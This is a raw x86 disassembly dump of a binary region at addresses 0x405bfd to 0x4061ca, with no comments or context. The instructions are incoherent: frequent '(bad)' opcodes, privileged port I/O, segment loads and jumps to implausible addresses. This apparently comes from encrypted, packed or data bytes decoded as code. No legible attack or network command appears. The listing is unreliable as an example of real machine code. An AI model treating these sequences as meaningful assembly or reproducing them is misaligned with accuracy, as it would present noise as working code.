  405bfd:	62 b3 96 69 94 b3    	bound  %esi,-0x4c6b966a(%ebx)
  405c03:	a0 37 3a 61 af       	mov    0xaf613a37,%al
  405c08:	ab                   	stos   %eax,%es:(%edi)
  405c09:	31 b3 83 e9 88 ba    	xor    %esi,-0x4577167d(%ebx)
  405c0f:	62 68 64             	bound  %ebp,0x64(%eax)
  405c12:	69 30 3f db d1 73    	imul   $0x73d1db3f,(%eax),%esi
  405c18:	b0 36                	mov    $0x36,%al
  405c1a:	bb 89 92 18 3a       	mov    $0x3a189289,%ebx
  405c1f:	66 eb c1             	data16 jmp 0x405be3
  405c22:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405c23:	9b                   	fwait
  405c24:	97                   	xchg   %eax,%edi
  405c25:	9b                   	fwait
  405c26:	3a 57 9e             	cmp    -0x62(%edi),%dl
  405c29:	ef                   	out    %eax,(%dx)
  405c2a:	67 6e                	outsb  %ds:(%si),(%dx)
  405c2c:	d0 d7                	rcl    $1,%bh
  405c2e:	6e                   	outsb  %ds:(%esi),(%dx)
  405c2f:	66 68 93 dd          	pushw  $0xdd93
  405c33:	ef                   	out    %eax,(%dx)
  405c34:	ed                   	in     (%dx),%eax
  405c35:	e0 c1                	loopne 0x405bf8
  405c37:	99                   	cltd
  405c38:	97                   	xchg   %eax,%edi
  405c39:	ed                   	in     (%dx),%eax
  405c3a:	fd                   	std
  405c3b:	35 80 a7 25 66       	xor    $0x6625a780,%eax
  405c40:	68 ef 6f 6e e5       	push   $0xe56e6fef
  405c45:	30 38                	xor    %bh,(%eax)
  405c47:	67 e1 f1             	loopew 0x405c3b
  405c4a:	ae                   	scas   %es:(%edi),%al
  405c4b:	9b                   	fwait
  405c4c:	97                   	xchg   %eax,%edi
  405c4d:	9b                   	fwait
  405c4e:	b3 9e                	mov    $0x9e,%bl
  405c50:	41                   	inc    %ecx
  405c51:	9c                   	pushf
  405c52:	b3 a1                	mov    $0xa1,%bl
  405c54:	80 17 24             	adcb   $0x24,(%edi)
  405c57:	66 68 34 d2          	pushw  $0xd234
  405c5b:	37                   	aaa
  405c5c:	4a                   	dec    %edx
  405c5d:	64 3a 8e 5f 90 c5 99 	cmp    %fs:-0x663a6fa1(%esi),%cl
  405c64:	00 e8                	add    %ch,%al
  405c66:	fe                   	(bad)
  405c67:	24 68                	and    $0x68,%al
  405c69:	8c 9c 78 68 64 b3 e3 	mov    %ds,-0x1c4c9b98(%eax,%edi,2)
  405c70:	c8 99 c5 99          	enter  $0xc599,$0x99
  405c74:	02 74 50 66          	add    0x66(%eax,%edx,2),%dh
  405c78:	e5 e1                	in     $0xe1,%eax
  405c7a:	9e                   	sahf
  405c7b:	9b                   	fwait
  405c7c:	97                   	xchg   %eax,%edi
  405c7d:	9b                   	fwait
  405c7e:	6a 8e                	push   $0xffffff8e
  405c80:	8c 45 3a             	mov    %es,0x3a(%ebp)
  405c83:	66 00 60 3b          	data16 add %ah,0x3b(%eax)
  405c87:	66 68 e9 bf          	pushw  $0xbfe9
  405c8b:	d2 95 9b c5 36 00    	rclb   %cl,0x36c59b(%ebp)
  405c91:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405c92:	f2 24 68             	repnz and $0x68,%al
  405c95:	0c f2                	or     $0xf2,%al
  405c97:	ae                   	scas   %es:(%edi),%al
  405c98:	2a 64 52 64          	sub    0x64(%edx,%edx,2),%ah
  405c9c:	68 64 ba 8e 90       	push   $0x908eba64
  405ca1:	81 c5 99 eb a0 1e    	add    $0x1ea0eb99,%ebp
  405ca7:	6f                   	outsl  %ds:(%esi),(%dx)
  405ca8:	a8 6b                	test   $0x6b,%al
  405caa:	be c3 6a 64 3a       	mov    $0x3a646ac3,%esi
  405caf:	0e                   	push   %cs
  405cb0:	6c                   	insb   (%dx),%es:(%edi)
  405cb1:	65 3a 66 e5          	cmp    %gs:-0x1b(%esi),%ah
  405cb5:	e1 c6                	loope  0x405c7d
  405cb7:	98                   	cwtl
  405cb8:	97                   	xchg   %eax,%edi
  405cb9:	9b                   	fwait
  405cba:	6a eb                	push   $0xffffffeb
  405cbc:	ed                   	in     (%dx),%eax
  405cbd:	d0 c7                	rol    $1,%bh
  405cbf:	99                   	cltd
  405cc0:	97                   	xchg   %eax,%edi
  405cc1:	34 d2                	xor    $0xd2,%al
  405cc3:	13 75 64             	adc    0x64(%ebp),%esi
  405cc6:	3a ef                	cmp    %bh,%ch
  405cc8:	90                   	nop
  405cc9:	4d                   	dec    %ebp
  405cca:	c2 ef af             	ret    $0xafef
  405ccd:	9b                   	fwait
  405cce:	8f c6                	pop    %esi
  405cd0:	95                   	xchg   %eax,%ebp
  405cd1:	9b                   	fwait
  405cd2:	c5 35 e5 e1 8e 9b    	lds    0x9b8ee1e5,%esi
  405cd8:	97                   	xchg   %eax,%edi
  405cd9:	9b                   	fwait
  405cda:	6a 8e                	push   $0xffffff8e
  405cdc:	44                   	inc    %esp
  405cdd:	9e                   	sahf
  405cde:	c5 99 eb a0 36 6f    	lds    0x6f36a0eb(%ecx),%ebx
  405ce4:	a8 6b                	test   $0x6b,%al
  405ce6:	be 0f 6a 64 3a       	mov    $0x3a646a0f,%esi
  405ceb:	0e                   	push   %cs
  405cec:	dc ac 78 66 e5 e1 c6 	fsubrl -0x391e1a9a(%eax,%edi,2)
  405cf3:	98                   	cwtl
  405cf4:	97                   	xchg   %eax,%edi
  405cf5:	9b                   	fwait
  405cf6:	6a 8e                	push   $0xffffff8e
  405cf8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405cf9:	45                   	inc    %ebp
  405cfa:	3a 66 e5             	cmp    -0x1b(%esi),%ah
  405cfd:	e1 8e                	loope  0x405c8d
  405cff:	9b                   	fwait
  405d00:	97                   	xchg   %eax,%edi
  405d01:	9b                   	fwait
  405d02:	6a eb                	push   $0xffffffeb
  405d04:	ed                   	in     (%dx),%eax
  405d05:	98                   	cwtl
  405d06:	c4 99 97 34 d2 df    	les    -0x202dcb69(%ecx),%ebx
  405d0c:	49                   	dec    %ecx
  405d0d:	64 3a 8e 63 82 c5 99 	cmp    %fs:-0x663a7d9d(%esi),%cl
  405d14:	e1 e1                	loope  0x405cf7
  405d16:	a2 9b 97 9b b3       	mov    %al,0xb39b979b
  405d1b:	9e                   	sahf
  405d1c:	41                   	inc    %ecx
  405d1d:	9c                   	pushf
  405d1e:	b3 a1                	mov    $0xa1,%bl
  405d20:	02 20                	add    (%eax),%ah
  405d22:	50                   	push   %eax
  405d23:	66 e5 e1             	in     $0xe1,%ax
  405d26:	82 98 97 9b 6a 8e 50 	sbbb   $0x50,-0x71956469(%eax)
  405d2d:	45                   	inc    %ebp
  405d2e:	3a 66 eb             	cmp    -0x15(%esi),%ah
  405d31:	a0 26 e7 af 36       	mov    0x36afe726,%al
  405d36:	53                   	push   %ebx
  405d37:	66 68 a3 bf          	pushw  $0xbfa3
  405d3b:	de 96 9b c5 22 68    	ficoms 0x6822c59b(%esi)
  405d41:	64 3a a1 ed 80 c4 99 	cmp    %fs:-0x663b7f13(%ecx),%ah
  405d48:	97                   	xchg   %eax,%edi
  405d49:	65 3a 66 68          	cmp    %gs:0x68(%esi),%ah
  405d4d:	e7 87                	out    %eax,$0x87
  405d4f:	fe                   	(bad)
  405d50:	95                   	xchg   %eax,%ebp
  405d51:	9b                   	fwait
  405d52:	c5 66 1c             	lds    0x1c(%esi),%esp
  405d55:	78 5c                	js     0x405db3
  405d57:	a1 ed 8c c4 99       	mov    0x99c48ced,%eax
  405d5c:	97                   	xchg   %eax,%edi
  405d5d:	65 3a ef             	gs cmp %bh,%ch
  405d60:	90                   	nop
  405d61:	4d                   	dec    %ebp
  405d62:	c2 ef af             	ret    $0xafef
  405d65:	e9 bf de 96 9b       	jmp    0x9bd73c29
  405d6a:	c5 36                	lds    (%esi),%esi
  405d6c:	80 51 dc 99          	adcb   $0x99,-0x24(%ecx)
  405d70:	97                   	xchg   %eax,%edi
  405d71:	3d b7 e3 cc 99       	cmp    $0x99cce3b7,%eax
  405d76:	c5 99 38 e9 bf de    	lds    -0x214016c8(%ecx),%ebx
  405d7c:	96                   	xchg   %eax,%esi
  405d7d:	9b                   	fwait
  405d7e:	c5 36                	lds    (%esi),%esi
  405d80:	02 64 50 66          	add    0x66(%eax,%edx,2),%ah
  405d84:	02 44 50 66          	add    0x66(%eax,%edx,2),%al
  405d88:	02 64 50 66          	add    0x66(%eax,%edx,2),%ah
  405d8c:	e5 e1                	in     $0xe1,%eax
  405d8e:	c6                   	(bad)
  405d8f:	98                   	cwtl
  405d90:	97                   	xchg   %eax,%edi
  405d91:	9b                   	fwait
  405d92:	6a 0c                	push   $0xc
  405d94:	68 8c 14 78 68       	push   $0x6878148c
  405d99:	64 33 a6 67 e0 b8 67 	xor    %fs:0x67b8e067(%esi),%esp
  405da0:	68 64 c5 d3 c0       	push   $0xc0d3c564
  405da5:	99                   	cltd
  405da6:	c5 99 80 8b 26 66    	lds    0x66268b80(%ecx),%ebx
  405dac:	68 ed c2 67 90       	push   $0x9067c2ed
  405db1:	ed                   	in     (%dx),%eax
  405db2:	fd                   	std
  405db3:	99                   	cltd
  405db4:	dd c4                	ffree  %st(4)
  405db6:	c7                   	(bad)
  405db7:	99                   	cltd
  405db8:	97                   	xchg   %eax,%edi
  405db9:	0c 1c                	or     $0x1c,%al
  405dbb:	ad                   	lods   %ds:(%esi),%eax
  405dbc:	2a 64 52 f7          	sub    -0x9(%edx,%edx,2),%ah
  405dc0:	a0 26 3a eb ed       	mov    0xedeb3a26,%al
  405dc5:	98                   	cwtl
  405dc6:	c4 99 97 34 d2 b3    	les    -0x4c2dcb69(%ecx),%ebx
  405dcc:	48                   	dec    %eax
  405dcd:	64 3a e5             	fs cmp %ch,%ah
  405dd0:	ac                   	lods   %ds:(%esi),%al
  405dd1:	74 fc                	je     0x405dcf
  405dd3:	e3 eb                	jecxz  0x405dc0
  405dd5:	9f                   	lahf
  405dd6:	c5 99 68 8f 14 e7    	lds    -0x18eb7098(%ecx),%ebx
  405ddc:	af                   	scas   %es:(%edi),%eax
  405ddd:	64 0a 66 68          	or     %fs:0x68(%esi),%ah
  405de1:	e9 bf 9a 96 9b       	jmp    0x9bd6f8a5
  405de6:	c5 36                	lds    (%esi),%esi
  405de8:	00 ed                	add    %ch,%ch
  405dea:	f2 24 68             	repnz and $0x68,%al
  405ded:	8c 60 78             	mov    %fs,0x78(%eax)
  405df0:	68 64 b3 a0 61       	push   $0x61a0b364
  405df5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405df6:	4f                   	dec    %edi
  405df7:	7d 00                	jge    0x405df9
  405df9:	8c 39                	mov    %?,(%ecx)
  405dfb:	66 68 8c 98          	pushw  $0x988c
  405dff:	7b 68                	jnp    0x405e69
  405e01:	64 ba e3 eb 9f c5    	fs mov $0xc59febe3,%edx
  405e07:	99                   	cltd
  405e08:	69 ee bf e5 93 9b    	imul   $0x9b93e5bf,%esi,%ebp
  405e0e:	c5 5a 6d             	lds    0x6d(%edx),%ebx
  405e11:	16                   	push   %ss
  405e12:	f2 6f                	repnz outsl %ds:(%esi),(%dx)
  405e14:	9e                   	sahf
  405e15:	6b be 6f 69 64 3a 0e 	imul   $0xe,0x3a64696f(%esi),%edi
  405e1c:	68 94 3a 66 80       	push   $0x80663a94
  405e21:	1b 27                	sbb    (%edi),%esp
  405e23:	66 68 ed c2          	pushw  $0xc2ed
  405e27:	57                   	push   %edi
  405e28:	90                   	nop
  405e29:	ed                   	in     (%dx),%eax
  405e2a:	fd                   	std
  405e2b:	0e                   	push   %cs
  405e2c:	6c                   	insb   (%dx),%es:(%edi)
  405e2d:	65 3a 66 e5          	cmp    %gs:-0x1b(%esi),%ah
  405e31:	e1 aa                	loope  0x405ddd
  405e33:	9a 97 9b 6a 30 80 93 	lcall  $0x9380,$0x306a9b97
  405e3a:	27                   	daa
  405e3b:	66 68 0e 3b          	pushw  $0x3b0e
  405e3f:	0e                   	push   %cs
  405e40:	16                   	push   %ss
  405e41:	ac                   	lods   %ds:(%esi),%al
  405e42:	78 66                	js     0x405eaa
  405e44:	e5 e1                	in     $0xe1,%eax
  405e46:	aa                   	stos   %al,%es:(%edi)
  405e47:	9a 97 9b 6a 8e 83 d1 	lcall  $0xd183,$0x8e6a9b97
  405e4e:	c5 99 eb a0 36 5b    	lds    0x5b36a0eb(%ecx),%ebx
  405e54:	97                   	xchg   %eax,%edi
  405e55:	9b                   	fwait
  405e56:	3a 66 67             	cmp    0x67(%esi),%ah
  405e59:	e0 fc                	loopne 0x405e57
  405e5b:	66 68 64 b7          	pushw  $0xb764
  405e5f:	e3 e4                	jecxz  0x405e45
  405e61:	9f                   	lahf
  405e62:	c5 99 38 37 d2 ce    	lds    -0x312dc8c8(%ecx),%ebx
  405e68:	9f                   	lahf
  405e69:	9b                   	fwait
  405e6a:	c5 e5 ac             	(bad)
  405e6d:	6c                   	insb   (%dx),%es:(%edi)
  405e6e:	33 a6 67 e0 94 66    	xor    0x6694e067(%esi),%esp
  405e74:	68 64 50 66 97       	push   $0x97665064
  405e79:	d1 ae 9b 97 9b b7    	shrl   $1,-0x48646865(%esi)
  405e7f:	e3 e4                	jecxz  0x405e65
  405e81:	9f                   	lahf
  405e82:	c5 99 38 8c 44 7a    	lds    0x7a448c38(%ecx),%ebx
  405e88:	68 64 b7 e3 f4       	push   $0xf4e3b764
  405e8d:	99                   	cltd
  405e8e:	c5 99 38 9b 8f f2    	lds    -0xd7064c8(%ecx),%ebx
  405e94:	95                   	xchg   %eax,%ebp
  405e95:	9b                   	fwait
  405e96:	c5 8e 15 b3 c5 99    	lds    -0x663a4ceb(%esi),%ecx
  405e9c:	e1 a2                	loope  0x405e40
  405e9e:	c5 d3 fc             	(bad)
  405ea1:	99                   	cltd
  405ea2:	c5 99 80 1b 27 66    	lds    0x66271b80(%ecx),%ebx
  405ea8:	68 0c 25 ae 2a       	push   $0x2aae250c
  405ead:	64 d2 37             	shlb   %cl,%fs:(%edi)
  405eb0:	75 64                	jne    0x405f16
  405eb2:	3a 36                	cmp    (%esi),%dh
  405eb4:	00 7b f2             	add    %bh,-0xe(%ebx)
  405eb7:	24 68                	and    $0x68,%al
  405eb9:	32 d2                	xor    %dl,%dl
  405ebb:	47                   	inc    %edi
  405ebc:	48                   	dec    %eax
  405ebd:	64 3a e5             	fs cmp %ch,%ah
  405ec0:	ac                   	lods   %ds:(%esi),%al
  405ec1:	70 33                	jo     0x405ef6
  405ec3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405ec4:	1d 4d 52 79 a0       	sbb    $0xa079524d,%eax
  405ec9:	26 3a 8e 5c 79 3a 66 	cmp    %es:0x663a795c(%esi),%cl
  405ed0:	e3 f9                	jecxz  0x405ecb
  405ed2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405ed3:	9b                   	fwait
  405ed4:	97                   	xchg   %eax,%edi
  405ed5:	9b                   	fwait
  405ed6:	b9 8d 52 37 b3       	mov    $0xb337528d,%ecx
  405edb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405edc:	69 97 69 99 dd f0 c7 	imul   $0x8c9799c7,-0xf226697(%edi),%edx
  405ee3:	99 97 8c 
  405ee6:	63 be 97 9b b9 a2    	arpl   %edi,-0x5d466469(%esi)
  405eec:	64 8f                	fs (bad)
  405eee:	25 ed ed f8 c7       	and    $0xc7f8eded,%eax
  405ef3:	99                   	cltd
  405ef4:	97                   	xchg   %eax,%edi
  405ef5:	e7 d2                	out    %eax,$0xd2
  405ef7:	55                   	push   %ebp
  405ef8:	38 32                	cmp    %dh,(%edx)
  405efa:	c5 d3 fc             	(bad)
  405efd:	99                   	cltd
  405efe:	c5 99 80 5a e2 99    	lds    -0x661da580(%ecx),%ebx
  405f04:	97                   	xchg   %eax,%edi
  405f05:	e7 fe                	out    %eax,$0xfe
  405f07:	6a e1                	push   $0xffffffe1
  405f09:	9c                   	pushf
  405f0a:	3b 9e e1 a3 6c 8e    	cmp    -0x71935c1f(%esi),%ebx
  405f10:	54                   	push   %esp
  405f11:	78 3a                	js     0x405f4d
  405f13:	66 af                	scas   %es:(%edi),%ax
  405f15:	e1 a6                	loope  0x405ebd
  405f17:	9b                   	fwait
  405f18:	97                   	xchg   %eax,%edi
  405f19:	9b                   	fwait
  405f1a:	3b 66 68             	cmp    0x68(%esi),%esp
  405f1d:	64 bb 91 07 27 3a    	fs mov $0x3a270791,%ebx
  405f23:	66 e5 e1             	in     $0xe1,%ax
  405f26:	8e 9b 97 9b 6a 8e    	mov    -0x71956469(%ebx),%ds
  405f2c:	90                   	nop
  405f2d:	78 3a                	js     0x405f69
  405f2f:	66 02 64 c5 d3       	data16 add -0x2d(%ebp,%eax,8),%ah
  405f34:	cc                   	int3
  405f35:	99                   	cltd
  405f36:	c5 99 80 17 26 66    	lds    0x66261780(%ecx),%ebx
  405f3c:	68 ed c2 57 90       	push   $0x9057c2ed
  405f41:	ed                   	in     (%dx),%eax
  405f42:	fd                   	std
  405f43:	99                   	cltd
  405f44:	dd c0                	ffree  %st(0)
  405f46:	c7                   	(bad)
  405f47:	99                   	cltd
  405f48:	97                   	xchg   %eax,%edi
  405f49:	8c 74 7d 68          	mov    %?,0x68(%ebp,%edi,2)
  405f4d:	64 b1 e3             	fs mov $0xe3,%cl
  405f50:	f4                   	hlt
  405f51:	99                   	cltd
  405f52:	c5 99 37 3a 61 af    	lds    -0x509ec5c9(%ecx),%ebx
  405f58:	aa                   	stos   %al,%es:(%edi)
  405f59:	60                   	pusha
  405f5a:	3a 33                	cmp    (%ebx),%dh
  405f5c:	e1 81                	loope  0x405edf
  405f5e:	b9 8a 64 37 6c       	mov    $0x6c37648a,%ecx
  405f63:	31 e3                	xor    %esp,%ebx
  405f65:	39 32                	cmp    %esi,(%edx)
  405f67:	d9 70 0f             	fnstenv 0xf(%eax)
  405f6a:	56                   	push   %esi
  405f6b:	35 e1 9c 3b 9e       	xor    $0x9e3b9ce1,%eax
  405f70:	e1 a3                	loope  0x405f15
  405f72:	69 8e e4 78 3a 66 e1 	imul   $0x99c221e1,0x663a78e4(%esi),%ecx
  405f79:	21 c2 99 
  405f7c:	1d 68 d2 e7 74       	sbb    $0x74e7d268,%eax
  405f81:	64 3a ed             	fs cmp %ch,%ch
  405f84:	3d 9c b7 32 6a       	cmp    $0x6a32b79c,%eax
  405f89:	74 68                	je     0x405ff3
  405f8b:	0c 28                	or     $0x28,%al
  405f8d:	8c 88 7d 68 64 b3    	mov    %cs,-0x4c9b9783(%eax)
  405f93:	a0 3b 32 d2 0f       	mov    0xfd2323b,%al
  405f98:	72 64                	jb     0x405ffe
  405f9a:	3a ef                	cmp    %bh,%ch
  405f9c:	90                   	nop
  405f9d:	55                   	push   %ebp
  405f9e:	c2 ef af             	ret    $0xafef
  405fa1:	37                   	aaa
  405fa2:	d2 3b                	sarb   %cl,(%ebx)
  405fa4:	74 64                	je     0x40600a
  405fa6:	3a 99 1d 68 b7 32    	cmp    0x32b7681d(%ecx),%bl
  405fac:	6e                   	outsb  %ds:(%esi),(%dx)
  405fad:	65 68 8e 38 7e 3a    	gs push $0x3a7e388e
  405fb3:	66 3b 8c 98 7f 68 64 	cmp    -0x489b9781(%eax,%ebx,4),%cx
  405fba:	b7 
  405fbb:	23 94 34 50 66 3e 0c 	and    0xc3e6650(%esp,%esi,1),%edx
  405fc2:	33 3a                	xor    (%edx),%edi
  405fc4:	28 64 50 66          	sub    %ah,0x66(%eax,%edx,2)
  405fc8:	02 64 d2 2b          	add    0x2b(%edx,%edx,8),%ah
  405fcc:	74 64                	je     0x406032
  405fce:	3a ef                	cmp    %bh,%ch
  405fd0:	ae                   	scas   %es:(%edi),%al
  405fd1:	ed                   	in     (%dx),%eax
  405fd2:	c2 91 8f             	ret    $0x8f91
  405fd5:	ed                   	in     (%dx),%eax
  405fd6:	7f 92                	jg     0x405f6a
  405fd8:	e1 a3                	loope  0x405f7d
  405fda:	50                   	push   %eax
  405fdb:	99                   	cltd
  405fdc:	3e 8c c8             	ds mov %cs,%eax
  405fdf:	7d 68                	jge    0x406049
  405fe1:	64 b7 23             	fs mov $0x23,%bh
  405fe4:	94                   	xchg   %eax,%esp
  405fe5:	34 6c                	xor    $0x6c,%al
  405fe7:	8e e8                	mov    %eax,%gs
  405fe9:	7e 3a                	jle    0x406025
  405feb:	66 3e 8c 90 7c 68 64 	data16 mov %ss,%ds:-0x4e9b9784(%eax)
  405ff2:	b1 
  405ff3:	23 94 3b 64 3d a1 a7 	and    -0x585ec29c(%ebx,%edi,1),%edx
  405ffa:	6f                   	outsl  %ds:(%esi),(%dx)
  405ffb:	ef                   	out    %eax,(%dx)
  405ffc:	8d                   	lea    (bad),%ebx
  405ffd:	dc 3a                	fdivrl (%edx)
  405fff:	76 68                	jbe    0x406069
  406001:	64 d2 bb 71 64 3a 30 	sarb   %cl,%fs:0x303a6471(%ebx)
  406008:	3f                   	aas
  406009:	db 1d 09 f4 1d b3    	fistpl 0xb31df409
  40600f:	9e                   	sahf
  406010:	41                   	inc    %ecx
  406011:	9c                   	pushf
  406012:	b3 a1                	mov    $0xa1,%bl
  406014:	02 61 c5             	add    -0x3b(%ecx),%ah
  406017:	13 60 8c             	adc    -0x74(%eax),%esp
  40601a:	00 7a 68             	add    %bh,0x68(%edx)
  40601d:	64 b3 a0             	fs mov $0xa0,%bl
  406020:	61                   	popa
  406021:	92                   	xchg   %eax,%edx
  406022:	4f                   	dec    %edi
  406023:	62 59 a4             	bound  %ebx,-0x5c(%ecx)
  406026:	d1 2f                	shrl   $1,(%edi)
  406028:	e9 93 2d 79 68       	jmp    0x68b98dc0
  40602d:	64 52                	fs push %edx
  40602f:	99                   	cltd
  406030:	67 64 3a eb          	addr16 fs cmp %bl,%ch
  406034:	ed                   	in     (%dx),%eax
  406035:	65 ca 99 97          	gs lret $0x9799
  406039:	34 6c                	xor    $0x6c,%al
  40603b:	8e 4c 78 3a          	mov    0x3a(%eax,%edi,2),%cs
  40603f:	66 02 65 c5          	data16 add -0x3b(%ebp),%ah
  406043:	13 64 e9 bf          	adc    -0x41(%ecx,%ebp,8),%esp
  406047:	67 98                	addr16 cwtl
  406049:	9b                   	fwait
  40604a:	c5 36                	lds    (%esi),%esi
  40604c:	80 8e 89 99 97 e7 fe 	orb    $0xfe,-0x18686677(%esi)
  406053:	6a 55                	push   $0x55
  406055:	9b                   	fwait
  406056:	c5 66 68             	lds    0x68(%esi),%esp
  406059:	10 3e                	adc    %bh,(%esi)
  40605b:	ef                   	out    %eax,(%dx)
  40605c:	98                   	cwtl
  40605d:	8f 28 e7 9f          	(bad)
  406061:	01 77 66             	add    %esi,0x66(%edi)
  406064:	68 0e 38 30 80       	push   $0x8030380e
  406069:	8f                   	(bad)
  40606a:	21 66 68             	and    %esp,0x68(%esi)
  40606d:	ed                   	in     (%dx),%eax
  40606e:	fc                   	cld
  40606f:	8d                   	lea    (bad),%eax
  406070:	c7                   	(bad)
  406071:	3b 64 af ab          	cmp    -0x55(%edi,%ebp,4),%esp
  406075:	31 b3 83 eb 88 26    	xor    %esi,0x2688eb83(%ebx)
  40607b:	35 3e 33 85 10       	xor    $0x1085333e,%eax
  406080:	6c                   	insb   (%dx),%es:(%edi)
  406081:	19 39                	sbb    %edi,(%ecx)
  406083:	ef                   	out    %eax,(%dx)
  406084:	90                   	nop
  406085:	4d                   	dec    %ebp
  406086:	c2 ef af             	ret    $0xafef
  406089:	0c 2f                	or     $0x2f,%al
  40608b:	ae                   	scas   %es:(%edi),%al
  40608c:	2a 64 c5 13          	sub    0x13(%ebp,%eax,8),%ah
  406090:	60                   	pusha
  406091:	8c 5e 99             	mov    %ds,-0x67(%esi)
  406094:	97                   	xchg   %eax,%edi
  406095:	9b                   	fwait
  406096:	b3 a0                	mov    $0xa0,%bl
  406098:	00 68 f2             	add    %ch,-0xe(%eax)
  40609b:	24 68                	and    $0x68,%al
  40609d:	32 d2                	xor    %dl,%dl
  40609f:	31 97 9b c5 e5 ac    	xor    %edx,-0x531a3a65(%edi)
  4060a5:	74 99                	je     0x406040
  4060a7:	66 e6 25             	data16 out %al,$0x25
  4060aa:	3a ef                	cmp    %bh,%ch
  4060ac:	90                   	nop
  4060ad:	4d                   	dec    %ebp
  4060ae:	c2 ef af             	ret    $0xafef
  4060b1:	0e                   	push   %cs
  4060b2:	3a 99 5d 64 b4 27    	cmp    0x27b4645d(%ecx),%bl
  4060b8:	68 8c 44 7a 68       	push   $0x687a448c
  4060bd:	64 bb 91 e5 68 3a    	fs mov $0x3a68e591,%ebx
  4060c3:	66 e5 21             	in     $0x21,%ax
  4060c6:	d4 36                	aam    $0x36
  4060c8:	3e 8c 48 7d          	mov    %cs,%ds:0x7d(%eax)
  4060cc:	68 64 50 66 97       	push   $0x97665064
  4060d1:	51                   	push   %ecx
  4060d2:	1a e8                	sbb    %al,%ch
  4060d4:	29 64 50 66          	sub    %esp,0x66(%eax,%edx,2)
  4060d8:	3e ef                	ds out %eax,(%dx)
  4060da:	7f 9c                	jg     0x406078
  4060dc:	43                   	inc    %ebx
  4060dd:	21 c8                	and    %ecx,%eax
  4060df:	36 e3 21             	ss jecxz 0x406103
  4060e2:	cc                   	int3
  4060e3:	4d                   	dec    %ebp
  4060e4:	2d 8a 6a 0c 68       	sub    $0x680c6a8a,%eax
  4060e9:	0e                   	push   %cs
  4060ea:	3a 0e                	cmp    (%esi),%cl
  4060ec:	68 64 ba 36 00       	push   $0x36ba64
  4060f1:	94                   	xchg   %eax,%esp
  4060f2:	f1                   	int1
  4060f3:	24 68                	and    $0x68,%al
  4060f5:	0c 3a                	or     $0x3a,%al
  4060f7:	ae                   	scas   %es:(%edi),%al
  4060f8:	2a 64 52 66          	sub    0x66(%edx,%edx,2),%ah
  4060fc:	6a 64                	push   $0x64
  4060fe:	3a 8e 2c 78 3a 66    	cmp    0x663a782c(%esi),%cl
  406104:	cb                   	lret
  406105:	50                   	push   %eax
  406106:	b5 27                	mov    $0x27,%ch
  406108:	68 0e 3a 99 5d       	push   $0x5d993a0e
  40610d:	44                   	inc    %esp
  40610e:	b4 27                	mov    $0x27,%ah
  406110:	68 0e 3a 36 02       	push   $0x2363a0e
  406115:	58                   	pop    %eax
  406116:	b1 23                	mov    $0x23,%cl
  406118:	9e                   	sahf
  406119:	4f                   	dec    %edi
  40611a:	7f 88                	jg     0x4060a4
  40611c:	eb 8c                	jmp    0x4060aa
  40611e:	5e                   	pop    %esi
  40611f:	36 02 70 50          	add    %ss:0x50(%eax),%dh
  406123:	72 00                	jb     0x406125
  406125:	64 3a e6             	fs cmp %dh,%ah
  406128:	38 0c e5 a1 2a 64 52 	cmp    %cl,0x52642aa1(,%eiz,8)
  40612f:	9f                   	lahf
  406130:	af                   	scas   %es:(%edi),%eax
  406131:	26 3a 0c 68          	cmp    %es:(%eax,%ebp,2),%cl
  406135:	8c 34 7a             	mov    %?,(%edx,%edi,2)
  406138:	68 64 99 9a e5       	push   $0xe59a9964
  40613d:	25 3a ef 90 65       	and    $0x6590ef3a,%eax
  406142:	c2 ef af             	ret    $0xafef
  406145:	0e                   	push   %cs
  406146:	3a 99 5d 44 b4 27    	cmp    0x27b4445d(%ecx),%bl
  40614c:	68 0e 3a 99 5d       	push   $0x5d993a0e
  406151:	50                   	push   %eax
  406152:	b5 27                	mov    $0x27,%ch
  406154:	68 0c 16 67 68       	push   $0x6867160c
  406159:	64 b1 23             	fs mov $0x23,%cl
  40615c:	9e                   	sahf
  40615d:	4f                   	dec    %edi
  40615e:	7f 88                	jg     0x4060e8
  406160:	eb 8c                	jmp    0x4060ee
  406162:	5e                   	pop    %esi
  406163:	36 02 35 50 72 00 6d 	add    %ss:0x6d007250,%dh
  40616a:	3a e6                	cmp    %dh,%ah
  40616c:	38 0c ca             	cmp    %cl,(%edx,%ecx,8)
  40616f:	ad                   	lods   %ds:(%esi),%eax
  406170:	2a 64 52 9f          	sub    -0x61(%edx,%edx,2),%ah
  406174:	af                   	scas   %es:(%edi),%eax
  406175:	26 3a 0c 68          	cmp    %es:(%eax,%ebp,2),%cl
  406179:	8c f0                	mov    %?,%eax
  40617b:	7d 68                	jge    0x4061e5
  40617d:	64 99                	fs cltd
  40617f:	36 e7 26             	ss out %eax,$0x26
  406182:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  406185:	0e                   	push   %cs
  406186:	38 0c 68             	cmp    %cl,(%eax,%ebp,2)
  406189:	0e                   	push   %cs
  40618a:	3a 0c 6d 0e 3b 0c 68 	cmp    0x680c3b0e(,%ebp,2),%cl
  406191:	0e                   	push   %cs
  406192:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  406195:	0c 86                	or     $0x86,%al
  406197:	64 68 64 50 66 02    	fs push $0x2665064
  40619d:	64 50                	fs push %eax
  40619f:	6e                   	outsb  %ds:(%esi),(%dx)
  4061a0:	02 70 d2             	add    -0x2e(%eax),%dh
  4061a3:	6b 74 64 3a ef       	imul   $0xffffffef,0x3a(%esp,%eiz,2),%esi
  4061a8:	ab                   	stos   %eax,%es:(%edi)
  4061a9:	0e                   	push   %cs
  4061aa:	3b 35 02 54 c5 53    	cmp    0x53c55402,%esi
  4061b0:	94                   	xchg   %eax,%esp
  4061b1:	e9 7b 66 80 0f       	jmp    0xfc0c831
  4061b6:	21 66 68             	and    %esp,0x68(%esi)
  4061b9:	0e                   	push   %cs
  4061ba:	3a 99 5d 44 b4 27    	cmp    0x27b4445d(%ecx),%bl
  4061c0:	68 0e 3a 99 5d       	push   $0x5d993a0e
  4061c5:	34 b5                	xor    $0xb5,%al
  4061c7:	24 68                	and    $0x68,%al
  4061c9:	0e                   	push   %cs
  4061ca:	5e                   	pop    %esi
